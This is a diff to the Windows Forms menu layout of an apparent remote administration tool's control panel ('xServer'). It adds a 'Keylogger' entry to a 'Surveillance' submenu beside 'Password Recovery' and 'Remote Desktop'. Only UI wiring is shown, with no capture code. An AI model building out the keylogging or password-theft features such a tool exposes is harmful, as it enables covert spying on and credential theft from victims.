@@ -52,6 +52,7 @@ namespace xServer.Forms
             this.ctxtSurveillance = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtRemoteDesktop = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtPasswordRecovery = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtKeylogger = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtMiscellaneous = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtRemoteExecute = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtLocalFile = new System.Windows.Forms.ToolStripMenuItem();
@@ -90,7 +91,7 @@ namespace xServer.Forms
             this.ctxtSurveillance,
             this.ctxtMiscellaneous});
             this.ctxtMenu.Name = "ctxtMenu";
-            this.ctxtMenu.Size = new System.Drawing.Size(150, 92);
+            this.ctxtMenu.Size = new System.Drawing.Size(153, 114);
             // 
             // ctxtConnection
             // 
@@ -101,7 +102,7 @@ namespace xServer.Forms
             this.ctxtUninstall});
             this.ctxtConnection.Image = ((System.Drawing.Image)(resources.GetObject("ctxtConnection.Image")));
             this.ctxtConnection.Name = "ctxtConnection";
-            this.ctxtConnection.Size = new System.Drawing.Size(149, 22);
+            this.ctxtConnection.Size = new System.Drawing.Size(152, 22);
             this.ctxtConnection.Text = "Connection";
             // 
             // ctxtUpdate
@@ -148,7 +149,7 @@ namespace xServer.Forms
             this.ctxtActions});
             this.ctxtSystem.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSystem.Image")));
             this.ctxtSystem.Name = "ctxtSystem";
-            this.ctxtSystem.Size = new System.Drawing.Size(149, 22);
+            this.ctxtSystem.Size = new System.Drawing.Size(152, 22);
             this.ctxtSystem.Text = "System";
             // 
             // ctxtSystemInformation
@@ -235,10 +236,11 @@ namespace xServer.Forms
             // 
             this.ctxtSurveillance.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.ctxtRemoteDesktop,
-            this.ctxtPasswordRecovery});
+            this.ctxtPasswordRecovery,
+            this.ctxtKeylogger});
             this.ctxtSurveillance.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSurveillance.Image")));
             this.ctxtSurveillance.Name = "ctxtSurveillance";
-            this.ctxtSurveillance.Size = new System.Drawing.Size(149, 22);
+            this.ctxtSurveillance.Size = new System.Drawing.Size(152, 22);
             this.ctxtSurveillance.Text = "Surveillance";
             // 
             // ctxtRemoteDesktop
@@ -258,6 +260,14 @@ namespace xServer.Forms
             this.ctxtPasswordRecovery.Text = "Password Recovery";
             this.ctxtPasswordRecovery.Click += new System.EventHandler(this.ctxtPasswordRecovery_Click);
             // 
+            // ctxtKeylogger
+            // 
+            this.ctxtKeylogger.Image = global::xServer.Properties.Resources.logger;
+            this.ctxtKeylogger.Name = "ctxtKeylogger";
+            this.ctxtKeylogger.Size = new System.Drawing.Size(175, 22);
+            this.ctxtKeylogger.Text = "Keylogger";
+            this.ctxtKeylogger.Click += new System.EventHandler(this.ctxtKeylogger_Click);
+            // 
             // ctxtMiscellaneous
             // 
             this.ctxtMiscellaneous.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -266,7 +276,7 @@ namespace xServer.Forms
             this.ctxtShowMessagebox});
             this.ctxtMiscellaneous.Image = ((System.Drawing.Image)(resources.GetObject("ctxtMiscellaneous.Image")));
             this.ctxtMiscellaneous.Name = "ctxtMiscellaneous";
-            this.ctxtMiscellaneous.Size = new System.Drawing.Size(149, 22);
+            this.ctxtMiscellaneous.Size = new System.Drawing.Size(152, 22);
             this.ctxtMiscellaneous.Text = "Miscellaneous";
             // 
             // ctxtRemoteExecute
@@ -770,6 +780,7 @@ namespace xServer.Forms
         private System.Windows.Forms.ToolStripMenuItem ctxtRemoteExecute;
         private System.Windows.Forms.ToolStripMenuItem ctxtLocalFile;
         private System.Windows.Forms.ToolStripMenuItem ctxtWebFile;
+        private System.Windows.Forms.ToolStripMenuItem ctxtKeylogger;
     }
 }
 
